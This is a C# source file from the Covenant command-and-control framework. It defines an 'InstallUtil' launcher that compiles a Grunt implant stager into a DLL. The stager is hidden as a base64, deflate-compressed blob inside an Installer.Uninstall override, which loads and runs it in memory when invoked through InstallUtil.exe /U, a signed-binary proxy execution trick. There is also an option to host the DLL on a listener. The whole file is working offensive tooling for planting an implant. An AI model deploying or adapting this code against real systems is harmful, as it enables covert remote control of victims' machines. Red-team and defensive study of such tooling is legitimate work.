// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using System.Collections.Generic;
using Microsoft.CodeAnalysis;

using Covenant.Models.Grunts;
using Covenant.Models.Listeners;
using Covenant.Core;

namespace Covenant.Models.Launchers
{
    public class InstallUtilLauncher : DiskLauncher
    {
        public InstallUtilLauncher()
        {
            this.Name = "InstallUtil";
            this.Type = LauncherType.InstallUtil;
            this.Description = "Uses installutil.exe to start a Grunt via Uninstall method.";
            this.OutputKind = OutputKind.WindowsApplication;
        }

        public override string GetLauncher(Listener listener, Grunt grunt, HttpProfile profile)
        {
            this.StagerCode = listener.GetGruntStagerCode(grunt, profile);
            this.Base64ILByteString = listener.CompileGruntStagerCode(grunt, profile, this.OutputKind, true);
            string code = CodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);

            List<Compiler.Reference> references = Common.DefaultReferences;
            references.Add(new Compiler.Reference
            {
                File = "System.Configuration.Install.dll",
                Framework = grunt.DotNetFrameworkVersion,
                Enabled = true
            });
            this.DiskCode = Convert.ToBase64String(Compiler.Compile(new Compiler.CompilationRequest
            {
                Source = code,
                ResourceDirectory = Common.CovenantResourceDirectory,
                ReferenceDirectory = Common.CovenantReferenceDirectory,
                TargetDotNetVersion = grunt.DotNetFrameworkVersion,
                OutputKind = OutputKind.DynamicallyLinkedLibrary,
                References = references
            }));

            this.LauncherString = "InstallUtil.exe" + " " + "/U" + " " + "file.dll";
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
                Uri hostedLocation = new Uri(httpListener.Url + hostedFile.Path);
                this.LauncherString = "InstallUtil.exe" + " " + "/U" + " " + hostedFile.Path.Split('/').Last();
                return hostedLocation.ToString();
            }
            else { return ""; }
        }

        private static string CodeTemplate =
@"using System;
class Program
{
    static void Main(string[] args)
    {
    }
}
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        var oms = new System.IO.MemoryStream();
        var ds = new System.IO.Compression.DeflateStream(new System.IO.MemoryStream(System.Convert.FromBase64String(""{{GRUNT_IL_BYTE_STRING}}"")), System.IO.Compression.CompressionMode.Decompress);
        var by = new byte[1024];
        var r = ds.Read(by, 0, 1024);
        while (r > 0)
        {
            oms.Write(by, 0, r);
            r = ds.Read(by, 0, 1024);
        }
        System.Reflection.Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { });
    }

}";
    }
}
